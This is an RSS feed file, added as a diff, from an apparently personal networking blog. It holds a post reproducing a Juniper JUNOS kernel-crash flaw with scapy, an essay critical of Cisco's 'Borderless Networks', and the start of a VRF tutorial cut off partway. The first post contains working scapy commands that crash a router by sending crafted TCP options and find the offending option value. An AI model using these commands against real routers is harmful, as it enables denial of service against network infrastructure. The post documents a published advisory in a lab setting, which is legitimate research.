@@ -1,0 +1,1636 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Networking on Jeremy Rossi</title>
+    <link>https://jeremyrossi.com/categories/networking/</link>
+    <description>Recent content in Networking on Jeremy Rossi</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 10 Jan 2010 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://jeremyrossi.com/categories/networking/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Juniper Kernel Crash - scapy Code</title>
+      <link>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</link>
+      <pubDate>Sun, 10 Jan 2010 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</guid>
+      <description>&lt;p&gt;On January 6th, we wrote about &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/&#34;&gt;a JUNOS flaw&lt;/a&gt;
+that caused a kernel crash in Juniper routers and demonstrated
+the &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-kernel-crash-video/&#34;&gt;effect in action&lt;/a&gt;
+in a video. At the time Juniper was not making details of the advisory public, however since
+then &lt;a href=&#34;http://osvdb.org/ref/61/juniper-PSN-2010-01-623.txt&#34;&gt;PSN-2010-01-623&lt;/a&gt; has shown up on
+the Open Source Vulnerability Database under entry &lt;a href=&#34;http://osvdb.org/61538&#34;&gt;61538&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Following the Juniper kernel flaw posts, we received a number of inquiries regarding how
+to determine the option value to use, however we were somewhat reluctant to provide
+that level of detail. Now that &lt;a href=&#34;http://evilrouters.net/2010/01/09/junos-psn-2010-01-623-exploit/&#34;&gt;exploit code has been published&lt;/a&gt;
+elsewhere, there is little reason not to answer this question.&lt;/p&gt;
+
+&lt;p&gt;To test all possible TCP options using &lt;a href=&#34;http://www.secdev.org/projects/scapy/&#34;&gt;scapy&lt;/a&gt;
+(a python based packet manipulation program), first download the latest copy of
+scapy (including all library dependencies) from their
+&lt;a href=&#34;http://hg.secdev.org/scapy/&#34;&gt;Mercurial code repository&lt;/a&gt; as shown below:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ hg clone http://hg.secdev.org/scapy/
+$ cd scapy
+$ python setup build
+$ sudo python setup install
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Start scapy as root:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ sudo run_scapy
+INFO: Can&#39;t import python gnuplot wrapper . Won&#39;t be able to plot.
+INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().
+WARNING: No route found for IPv6 destination :: (no default route?)
+Welcome to Scapy (2.1.0-dev)
+&amp;gt;&amp;gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We started this particular test by first creating an IP packet with a destination of the Juniper test router instance named &amp;lsquo;ipl&amp;rsquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ipl = IP(dst=&amp;quot;172.17.20.102&amp;quot;)
+&amp;gt;&amp;gt;&amp;gt; ipl
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Initially we tested all TCP options as fast as possible just to see if it was possible to reproduce the
+reported vulnerability (a kernel crash that causes the router to reboot).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; send([ipl/TCP(dport=23, options=[(x, &amp;quot;&amp;quot;)])/&amp;quot;bye bye&amp;quot; for x in range(256)])
+................................................................................................................
+................................................................................................................
+................................
+Sent 256 packets.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The previous command created 255 packets with every possible TCP option, sent them all
+at once, and the router crashed. While this performed as expected, it only told us
+that we were on the right track (the advisory was correct, an option setting
+crashes the router), however it does not tell us which option.&lt;/p&gt;
+
+&lt;p&gt;The scapy tool can send a ping following each test packet to see if the router
+is still up and responding, as demonstrated:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; for x in range(255):
+...   send(ipl/TCP(dport=&amp;quot;22&amp;quot;, options=[(x,&amp;quot;&amp;quot;)])
+...   if not sr1(/ICMP(), retry=-1, timeout=1, verbose=0):
+...     print &amp;quot;we have a winner: %s&amp;quot;%(x)
+...     break
+...
+we have a winner: 101
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we have a winner, we know which option value caused the kernel crash
+Juniper reported.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Are borderless networks possiable?</title>
+      <link>https://jeremyrossi.com/blog/2009/08/15/are-borderless-networks-possiable/</link>
+      <pubDate>Sat, 15 Aug 2009 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2009/08/15/are-borderless-networks-possiable/</guid>
+      <description>
+
+&lt;p&gt;I attended &lt;a href=&#34;http://www.scmagazineus.com/SC-World-Congress-2009/section/886/&#34;&gt;SC World Congress&lt;/a&gt;
+in New York this week and a keynote from Cisco caught my attention: &lt;em&gt;Securing
+the Cloud: Building the Borderless Network&lt;/em&gt;.  I became fixated on the words
+used over and over by &lt;a href=&#34;http://www.scmagazineus.com/Joel-McFarland-senior-manager-Product-Management-Security-Technology-Group-Cisco-Systems/article/149536/&#34;&gt;Joel McFarland&lt;/a&gt;.
+Borderless this, borderless that, borderless everything.  This campaign started
+to bother me as this was a security conference and a network company was
+pushing the idea of less borders.  It seemed off, wrong, and incomplete to me.&lt;/p&gt;
+
+&lt;h2 id=&#34;little-bit-of-history:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Little Bit of History&lt;/h2&gt;
+
+&lt;p&gt;I am going to quickly cover some of the history of the Internet and how it
+grew borders, but please skip to the highlight of the article if you are
+familiar with this already: &lt;a href=&#34;#borderless-what&#34;&gt;Borderless Networks, What?&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;arpanet-69-91:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;ARPANET (&amp;lsquo;69-&amp;lsquo;91)&lt;/h4&gt;
+
+&lt;p&gt;In the beginning, there was &lt;a href=&#34;http://en.wikipedia.org/wiki/ARPANET&#34;&gt;ARPANET&lt;/a&gt;
+which was the pioneer in packet switching networks and gave providers the
+choice of which method and hardware for communication it would use.  However,
+the base protocol used for devices to communicate in ARPANET was NCP.&lt;br /&gt;
+The NCP  protocol could best be described as a network device driver and
+less as a network transport stack. It did not have any method for end-to-end
+error handling which was seen as a problem, but nothing was done about
+this until 1983.&lt;/p&gt;
+
+&lt;p&gt;In 1983, TCP/IP replaced NCP as the protocol for transport and ARPANET became
+a part of what was to become the Internet.  TCP/IP was a huge improvement
+over NCP in that it accounted for problems on the network and allowed the
+network not to come to a grinding halt when packets were lost.  It also
+achieved the concept of end-to-end connectivity between each host.  This
+meant that as long as two hosts were on the Internet they could reach
+each other by utilizing standard TCP/IP.  This standard framework also
+lead to the growth of many different applications as there was no longer
+any need to make changes to the network to add new applications/protocols.&lt;/p&gt;
+
+&lt;h4 id=&#34;first-borders-91-94:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;First Borders (&amp;lsquo;91-&amp;lsquo;94)&lt;/h4&gt;
+
+&lt;p&gt;All the building blocks were in place and  what formed was a large group
+of interconnected networks to share and exchange data. Then the first virus
+and worm hit in 1983 and 1988 respectively.  The
+&lt;a href=&#34;http://en.wikipedia.org/wiki/Morris_worm&#34;&gt;morris worm&lt;/a&gt; gained a fair amount
+of media attention and in fact prompted the establishment of &lt;a href=&#34;http://www.cert.org/&#34;&gt;CERT
+&lt;/a&gt;.  Even in this embryonic stage the vitality of the
+information being shared caused many researchers to begin placing limitations
+on the end-to-end connectivity of their hosts.  Thus began the &lt;em&gt;&amp;lsquo;Us&amp;rsquo;&lt;/em&gt;
+and &lt;em&gt;&amp;lsquo;Them&amp;rsquo;&lt;/em&gt; status of the Internet.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&amp;lsquo;Us&amp;rsquo;&lt;/em&gt; and &lt;em&gt;&amp;lsquo;Them&amp;rsquo;&lt;/em&gt; started out simple with a move to keep
+networks segregated-or put another way, adding a border
+between the networks. At first, the borders were nothing more
+than routers that limited the effects from network &lt;em&gt;A&lt;/em&gt; from
+spilling over into network &lt;em&gt;B&lt;/em&gt;. They were effective, but in 1991
+&lt;a href=&#34;http://en.wikipedia.org/wiki/Digital_Equipment_Corporation&#34;&gt;DEC&lt;/a&gt;
+released the first modern Firewall: SEAL. This marked the first real
+security border on the Internet, where all packets were inspected and
+compared to a set of policy rules before being passed on. These first
+security borders were instrumental in providing the trust and assurance
+in the network that companies and researchers required, speeding the
+growth of the Internet. While intrusion was still possible, the bar of
+entry was raised beyond causal attacks and probes.&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 1: Us vs. Them&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/static/img/us-them.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/statis/img/us-them.png&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;300&#34; height=&#34;233&#34; /&gt; &lt;/a&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 1: Us vs. Them&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/static/img/us-them.png&#34;&gt;Figure 1: Us vs. Them&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;In 1992, the dominant addressing of hosts was IPv4, where each host is a
+assigned a 32-bit address.  This assignment limited the total number of
+addressable hosts to 4,294,967,296, but, due to reservations and subnetting,
+this could never be fully utilized.  At this time, it was recognized that
+IPv4 limitations would be become a problem in the future, beginning
+the process of creating a new IP protocol with a much higher number
+of addressable hosts. IPv6 was born in 1994, based on a 128-bit
+address for each host.  This would effectively allow every man,
+woman, and child on Earth to be assigned an address many times over.&lt;br /&gt;
+As a part of the formation of IPv6, security between networks was
+also taken into account and &lt;a href=&#34;http://en.wikipedia.org/wiki/IPsec&#34;&gt;IPSec&lt;/a&gt;
+was created as a requirement of the IPv6 protocol.&lt;/p&gt;
+
+&lt;p&gt;IPv6&amp;rsquo;s creation gave the Internet a secure method of communications
+between networks via IPSEC and nearly unlimited address space, but
+IPv6 did not get off the ground quickly.  This was mostly due to the
+fact that all devices and operating systems would need to be upgraded to
+handle the new protocol, and there was little to no pressure from the
+market to push things forward.   IPSec on the other hand did take off,
+as it quickly became the standard method for interconnecting trusted
+networks over an untrusted medium (such as the Internet).&lt;/p&gt;
+
+&lt;p&gt;At the same time that IPv6 and IPSec were being developed, another
+group of people began working on an alternate method for dealing
+with the lack of addressable space in IPv4.&lt;br /&gt;
+&lt;a href=&#34;http://en.wikipedia.org/wiki/Network_address_translation&#34;&gt;Network Address Translation (NAT)&lt;/a&gt;
+was published in &lt;a href=&#34;http://www.ietf.org/rfc/rfc1631.txt&#34;&gt;RFC1631&lt;/a&gt; in 1994
+as a short term solution, while the larger problems were being
+addressed.  NAT became very successful quickly as it allows a very
+large number of hosts to access the larger Internet while using very
+few publicly addressable IP addresses.  As with most things, NAT came
+with some trade-offs.  One of the big ones was that hosts no longer
+had complete end-to-end connectivity.  Thus, another border on the
+network was created; in practice firewalls became the dominate NAT
+devices.  Nonetheless, the NAT border would create problems for
+applications developers for years to come.&lt;/p&gt;
+
+&lt;h4 id=&#34;present-09:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Present (&amp;lsquo;09)&lt;/h4&gt;
+
+&lt;p&gt;In 2009, the way Internet runs is really not very different from
+1994;  IPv6 is just now getting underway, NAT is used everywhere,
+and IPSEC still secures networks over an untrusted medium. What
+has changed in a big way is the applications and uses of the Internet.&lt;br /&gt;
+Telephone calls commonly use the Internet for transport, on demand
+video is a huge source of traffic, social media networks garner huge
+numbers of users, online shopping is an important revenue stream for
+companies, and most recently more and more services are being
+hosted elastically on demand via the Internet.&lt;/p&gt;
+
+&lt;h2 id=&#34;borderless-what:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Borderless Networks. What?&lt;/h2&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s get back to Borderless Networks&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Cisco envisions a global network where you can go any place
+and access any data you could need at anytime.  John Chambers
+detailed the approach on a video at &lt;a href=&#34;http://cisco.com&#34;&gt;Cisco.com&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;In terms of what&amp;rsquo;s happening right now, I think the biggest market transition
+is the shift to a more collaborative world, which is only made possible by
+what we call an &amp;ldquo;intelligent, network-centric&amp;rdquo; world. This network-centric
+world encompasses the whole range of communication experiences and seamlessly
+delivers information. Consumers will access voice, the web, e-mail, and
+video by any of the 14 billion devices that we think will be connected to the
+internet by 2010, all loaded onto the network. In the very near future, for
+example, you won&amp;rsquo;t need to hang up your cell phone if you want to switch to
+a landline; you&amp;rsquo;ll stay connected as you change devices, as long as they&amp;rsquo;re
+all connected to a network.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.cisco.com/survey/exit.html?http://discussionleader.hbsp.com/hbreditors/2008/10/cisco_ceo_john_chambers_on_tea.html&#34;&gt;Cisco CEO John Chambers talks about Cisco&amp;rsquo;s collaborative management model&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Cisco also has a &lt;a href=&#34;http://www.cisco.com/web/solutions/netsys/g2/index.html?POSITION=social+media&amp;amp;COUNTRY_SITE=us&amp;amp;CAMPAIGN=Transformers+Launch&amp;amp;CREATIVE=Borderless+Networks+to+Index&amp;amp;REFERRING_SITE=Twitter&#34;&gt;Virtual event&lt;/a&gt;
+on Oct 20th for Borderless Networks, and have been encouraging people to
+register via &lt;a href=&#34;http://twitter.com/CiscoGeeks&#34;&gt;twitter&lt;/a&gt; and emails for the
+last two weeks.&lt;/p&gt;
+
+&lt;div class=&#34;panel panel-default&#34; style=&#34;float: right;width: 450px;text-align: left;margin: 5px;margin-left: 20px;&#34;&gt;
+  &lt;div class=&#34;panel-body&#34;&gt;
+
+&lt;h4&gt;LUNCH - Securing the cloud: Building the borderless network&lt;/h4&gt;
+
+An exploration into the “cloud” revealing the power of choice in email 
+security. Learn how to harness all the benefits that the cloud has to 
+offer while avoiding common pitfalls for early SaaS solutions. The 
+crumbling walls of network perimeters are forcing organizations to architect 
+new network designs to address the evolution of borderless networks. &lt;br&gt;
+&lt;br&gt;
+Attend this session and learn:&lt;br&gt;
+- Embracing the change to borderless networks&lt;br&gt;
+- Understanding Cisco&#39;s next-generation cloud security architecture&lt;br&gt;
+- Realizing the power of choice in choosing an email security solution&lt;br&gt;
+&lt;br&gt;
+- Joel McFarland, senior manager in the product management team within the Security Technology Group at Cisco Systems&lt;br&gt;
+
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a href=&#34;http://www.scmagazineus.com/Agenda-Day-1-2009/section/888/&#34;&gt;SC World Congress: Agenda Day 1&lt;/a&gt;&lt;/P&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I first learned of the Borderless Networks push during the
+&lt;a href=&#34;http://www.scmagazineus.com/SC-World-Congress-2009/section/886/&#34;&gt;SC World Congress&lt;/a&gt;.  I
+was there to get a preview of Borderless Networks as presented by Joel
+McFarland.  The session description sounded interesting and as it was a
+keynote there was nothing else to pull on my time.&lt;/p&gt;
+
+&lt;p&gt;Two co-workers and I attended the session, but being a little late we had to
+make our way to the very front of the room to find seats.  Up front we were able
+to hear and see everything in great detail, but in hindsight this might have
+not been the best place for us. There was no way Joel could have missed the
+looks of skepticism on all three of our faces.&lt;/p&gt;
+
+&lt;p&gt;Joel pushed the Cisco idea of Borderless Networks in many different ways, but
+pointed to the &lt;a title=&#34;Figure 2: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;iPhone&lt;/a&gt;
+as the game changer, the beginning of things to come.  Then iPhone and
+salesforce.com became his prime example of how the mobile sales team are
+almost completely disconnected from the enterprise network.  They access
+leads, manage contacts, input orders, and exchange notes and information all
+without even logging into the corporate network.  At this point, I looked to
+my co-workers with a questioning expression and whispered the rhetorical
+question &amp;ldquo;&lt;em&gt;No corporate login?&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;The example Joel used is common for a sales workforce, and is actively
+encouraged in many environments, but this was just something that I have
+always felt was wrong.  In many companies, sales leads are valuable
+information and something that competitors and even other sales people
+would actively try to gain access to.  When all access to this information
+is controlled by an external party you are no longer able to apply your own
+controls. In fact, you are beholden to the policies and procedures of the
+provider.  Joel was one step ahead of me on this.  He pointed out the
+problems that were playing through my head and countered that salesforce.com
+can be made to use a corporation&amp;rsquo;s internal authentication methods (Active
+Directory, RSA Token, etc.).  As such, your internal policies for access
+and removal of access are once again in your control.  I conceded. Joel
+is correct that salesforce.com can be brought into line with one&amp;rsquo;s internal
+security policy, but he does not address the issue of the remote device-the
+iPhone itself.&lt;/p&gt;
+
+&lt;h4 id=&#34;borderless:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Borderless&lt;/h4&gt;
+
+&lt;p&gt;Let me come back to the iPhone in a bit, I want to point out another slide
+that came up during this iPhone praise.  In
+&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;Figure 2&lt;/a&gt;
+I have created a combined version of the two slides Joel was showing to
+demonstrate the future of networking (I have recreated them from memory,
+but its close enough for this post).&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;500&#34; height=&#34;400&#34; /&gt; &lt;/a&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34;&gt;Figure 2: Before &amp; After&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;In Figure 2, we have the &lt;strong&gt;before&lt;/strong&gt; and &lt;strong&gt;after&lt;/strong&gt; sections.  According to
+Joel, currently the &lt;strong&gt;before&lt;/strong&gt; example is a good summary of how most enterprises
+networks allow access into and between their networks.  This Joel and I agree on.&lt;/p&gt;
+
+&lt;p&gt;As seen in the &lt;strong&gt;before&lt;/strong&gt; section, you have a defined entry point into the network
+from outside, where all external resources gain access.  This is your border between
+&amp;ldquo;&lt;em&gt;us&lt;/em&gt;&amp;rdquo; and &amp;ldquo;&lt;em&gt;them&lt;/em&gt;&amp;rdquo;.  In the examples, both the remote home desktop and iPhone
+access the network and are allowed across past the border only if proper authentication
+and authorization have take place.  Once completed, the remote device is granted
+access to the resources that are allowed for it to function as an effective job
+tool: access to to internet via internal proxy, access of files in the London
+office, or logging into the salesforce.com website.  The key thing is that all
+access flows through this single point of entry.&lt;/p&gt;
+
+&lt;p&gt;By restricting access for remote devices to a single point, we are able
+to overcome some technical shortcomings and greatly reduce the vectors
+of attack for the network. NAT is required due to the limited number
+of publicly addressable addresses. Thus end-to-end connectivity is not
+an option for the remote devices. The use of IPSec for transport and
+assigning a RFC1918 address to the remote device end of the IPSec tunnel
+allows one to overcome the NAT limitations. This gives you remote device
+end-to-end connectivity within the enterprise network. By using this
+method the network administrators are able to capture and monitor at a
+single point all access into and out of the network. NAC, IPS/IDS, and
+other methods of monitoring are commonly deployed here.&lt;/p&gt;
+
+&lt;p&gt;With the &lt;strong&gt;after&lt;/strong&gt; diagram of Figure 2, we see the future as Cisco/Joel
+see it. This is where all resources are able to access all other
+resources; also known as complete end-to-end connectivity. Joel did not
+say how this was to be achieved, but given the network diagram it&amp;rsquo;s not
+hard to surmise that Cisco is planning a big push for IPv6. IPv6 will
+allow for this type of network, and will bring down the NAT boundary.
+With it the technical limitation of too few addresses for end-to-end
+connectivity on the Internet is eliminated and things can get a lot more
+complex as we see in the &lt;strong&gt;after&lt;/strong&gt; section of the diagram.&lt;/p&gt;
+
+&lt;p&gt;On the &lt;strong&gt;after&lt;/strong&gt; diagram you see end-to-end connectivity to each
+resource both inside the network and outside. We have an iPhone going
+directly to salesforce.com, directly accessing a file in the London
+office, and able to access all the data that it could ever need. What
+about limiting access to resources? How do you make sure that a remote
+home desktop does not start copying all of the data from the London
+office, NYC office, and salesforce.com to a remote site? What if the
+desktop is infected with malware? How do you log the activity of the
+remote device access? All the questions become much harder when you have
+completed end-to-end connectivity, and historically we have learned it
+becomes an even larger problem when there are remote devices involved.&lt;/p&gt;
+
+&lt;p&gt;All the questions I have asked about the security of the &lt;strong&gt;after&lt;/strong&gt;
+sections can be answered with products already on the market and in
+fact are recommended for use in both networks. The problem becomes the
+scale that is needed to protect and defend a network that has complete
+end-to-end connectivity. Once again, going back to the &lt;strong&gt;after&lt;/strong&gt;
+diagram, only taking into account remote device access, the number of
+policies that needs to be maintained, protected, and monitored goes from
+1 to 4. Now a growth of 400% is big, but almost manageable. If you start
+to think about a small enterprise with 20 offices, 2 datacenters, and
+200 remote users, the problem of scale is instantly untenable.&lt;/p&gt;
+
+&lt;p&gt;IPv6 will solve a lot of problems for networks as the need for NAT
+will go away and devices will be able to directly address each other
+across networks and boundaries, but as with just about everything there
+are side effects. Keeping control of access into and out your network
+is the first line of defense and with IPv6 this becomes a policy and
+enforcement issue even if it is no longer a technical requirement.&lt;/p&gt;
+
+&lt;h4 id=&#34;the-iphone-key-to-the-borderless-network:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;The iPhone, Key to the Borderless Network&lt;/h4&gt;
+
+&lt;p&gt;Joel said he likes his iPhone and from the huge number of videos from Cisco featuring an iPhone it&amp;rsquo;s safe to assume Cisco does too.  During the keynote Joel pointed out the iPhone a few times in a number examples and in general with heavy praise.  Joel and I agree the iPhone is an amazing device, an important step forward in mobile computing.  After this Joel and I begin to disagree, namely around one key point: &amp;ldquo;&lt;em&gt;The iPhone is a game changer.&lt;/em&gt;&amp;rdquo;  I think that statement needs to add &amp;ldquo;&lt;em&gt;for the consumer market&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: left;margin: 5px;margin-left: 5px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 3: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;200&#34; height=&#34;330&#34; /&gt; &lt;/a&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 3: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;Figure 3: The iPhone&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;iPhones are enabling users to use the Internet from
+almost anyplace; it&amp;rsquo;s one of the most popular cameras on
+&lt;a href=&#34;http://www.flickr.com/cameras/&#34;&gt;flickr&lt;/a&gt;, has a huge list of
+applications, and, for some people, a complete replacement for
+the traditional computer. While its strong points work well
+in the consumer market, in the enterprise markets it&amp;rsquo;s a very
+different beast. In fact the strongest points for the iPhone in
+the consumer market are security concerns for the enterprise.
+Application controls are limited, centralized control is even more
+limited, and encryption of the data residing on the devices is a
+&lt;a href=&#34;http://www.wired.com/gadgetlab/2009/07/iphone-encryption/&#34;&gt;problem&lt;/a&gt; on
+the most fully featured phone to date.&lt;/p&gt;
+
+&lt;p&gt;Devices like the iPhone should be thought of less as a phone and more as
+a laptop. With that comes all the same protections and controls that we
+use to mitigate risk on an enterprise laptop. Here is a quick list of
+what I expect from a laptop and by extension from an iPhone for it to
+become a viable remote access device in the enterprise environment:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Virus and Malware software with centralized reporting&lt;/li&gt;
+&lt;li&gt;Secure communications for the device; both internal resources and the ability to define policies&lt;/li&gt;
+&lt;li&gt;Strong Data Encryption on the device&lt;/li&gt;
+&lt;li&gt;Ability to do remote kill of device&lt;/li&gt;
+&lt;li&gt;Application installation and run controls&lt;/li&gt;
+&lt;li&gt;Web Filter/Proxy controls&lt;/li&gt;
+&lt;li&gt;Access controls, password complexity settings and password failure data destruction&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Some of the areas listed are available on the iPhone, but none of them are near complete and ready for everyday use in an enterprise.  &lt;a href=&#34;http://www.rim.com/&#34;&gt;Research In Motion&lt;/a&gt; (RIM) dominates the enterprise market for the reasons I have listed here.  RIM via the BlackBerry Enterprise Server (BES) gives the enterprise complete control of every device that connects via a centralized management station.  BES also does network traffic correctly in that all devices came back to the BES at a single point of entry into the enterprise.  This allows an enterprise to place additional control directly attached to the BES and not with multiple devices all over the network.  RIM&amp;rsquo;s BES product represents the minimum level of security that should be expected for remote access of phone like devices. I would go so far as to say it should be the starting standard for how remote access devices should behave.&lt;/p&gt;
+
+&lt;p&gt;The iPhone might be the start of things to come, but in no way is it even close to ready for the enterprise market.&lt;/p&gt;
+
+&lt;h2 id=&#34;why:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Why?&lt;/h2&gt;
+
+&lt;p&gt;Cisco&amp;rsquo;s push with Borderless Networks is either something that they haven&amp;rsquo;t completely vetted from a security perspective or the security strategy isn&amp;rsquo;t completely explained in the marketing.  The huge increase in the number of points needing protection, the corresponding increase in the policy and management, and management data flow and access controls are areas that need addressing.  These are problems we still having troubles controlling with our current network deployments.  Unless Cisco has a magic bullet coming out of their research and development departments, I don&amp;rsquo;t see how this move to Borderless Networks is even possible.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>VRF is the new Black: How I Learned to Stop Worrying and Love the Complexity</title>
+      <link>https://jeremyrossi.com/blog/2009/08/15/vrf-is-the-new-black-how-i-learned-to-stop-worrying-and-love-the-complexity/</link>
+      <pubDate>Sat, 15 Aug 2009 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2009/08/15/vrf-is-the-new-black-how-i-learned-to-stop-worrying-and-love-the-complexity/</guid>
+      <description>
+
+&lt;p&gt;Breaking up your network &lt;em&gt;&amp;ldquo;is good,&amp;rdquo;&lt;/em&gt; we all know this, and VLANs have
+traditionally been used to segment a network to help with maintenance,
+management, and security; but, they are not the only game in town and often the
+wrong place to break your network into smaller and more efficient pieces. VPN
+Routing and Forwarding (VRF) can do the same for layer 3 infrastructure that
+VLANs do for layer 2. By allowing you to create and manage separate routing
+tables within a single physical router, they truly bring virtualization and
+segmentation to all points on your network. As with any technology that adds
+layers, complexity can become a problem, but you already know this.&lt;/p&gt;
+
+&lt;h2 id=&#34;table-of-contents:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Table of Contents&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#vrf-intro&#34;&gt;Virtual Routing and Forwarding (VRF)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#vrf-setup&#34;&gt;VRF Lite Setup&lt;/a&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#setup-junos&#34;&gt;Juniper JunOS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#setup-ios&#34;&gt;Cisco IOS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#setup-screenos&#34;&gt;Juniper ScreenOS&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;vrf-intro:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Virtual Routing and Forwarding (VRF)&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;It&amp;rsquo;s incredibly obvious, isn&amp;rsquo;t it? A foreign substance is introduced into our
+precious bodily fluids without the knowledge of the individual, and certainly
+without any choice.&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Gen Jack D. Ripper&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Virtual routing and forwarding (VRF) is a technology included in network routers
+that allows multiple instances of a routing table to exist in a single router
+all while working simultaneously.&lt;/p&gt;
+
+&lt;p&gt;Their are two types of VRFs: &lt;em&gt;&amp;ldquo;VRF&amp;rdquo;&lt;/em&gt; and &lt;em&gt;&amp;ldquo;VRF Lite.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;VRF Lite is just a subset of VRF without all the protocols used for creation of
+VPNs between routers, namely MPLS. VRFs are very common in service providers
